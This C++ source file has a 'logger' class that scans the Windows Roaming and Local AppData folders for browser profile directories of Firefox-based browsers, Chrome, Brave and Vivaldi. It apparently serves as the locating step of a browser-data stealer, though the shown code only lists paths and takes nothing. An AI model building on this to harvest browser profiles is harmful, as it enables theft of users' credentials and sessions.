/* API <windows.h>
Roaming (CSIDL_APPDATA)
Local (CSIDL_LOCAL_APPDATA)
LocalLow (CSIDL_LOCAL_APPDATA)
*/

#include <algorithm>
#include <vector>
#include <string>
#include <filesystem>
#include <windows.h>
#include <shlobj.h>
#include <iostream>

#include "logger.h"

void log_folders_in_path(const std::string& base_path, const std::vector<std::string>& target_folders, std::vector<std::string>& out_folders) {
    try {
        for (const auto& entry : std::filesystem::directory_iterator(base_path)) {
            if (entry.is_directory()) {
                std::string folder_name = entry.path().filename().string();

                if (std::find(target_folders.begin(), target_folders.end(), folder_name) != target_folders.end()) { // (std::find)<algorithm> include
                    out_folders.push_back(entry.path().string());
                }
            }
        }
    }
    catch (const std::filesystem::filesystem_error& e) {
        std::cerr << "Filesystem Error: " << e.what() << std::endl; // Output the error message for debugging
    }
}

std::vector<std::string> logger::log_appdata_folders() {
    char roaming_path[MAX_PATH];
    char local_path[MAX_PATH];

    std::vector<std::string> target_folders = { "Mozilla", "zen", "Floorp", "Google", "Brave", "Vivaldi" };
    std::vector<std::string> found_folders;

    bool roaming_ok = SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, roaming_path));
    bool local_ok = SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, local_path));

    if (!roaming_ok && !local_ok) {
        std::cerr << "Appdata directories not found!" << std::endl; // Output an error message for debugging
        return found_folders;
    }

    if (roaming_ok) {
        log_folders_in_path(roaming_path, target_folders, found_folders);
    }

    if (local_ok) {
        log_folders_in_path(local_path, target_folders, found_folders);
    }

    return found_folders;
}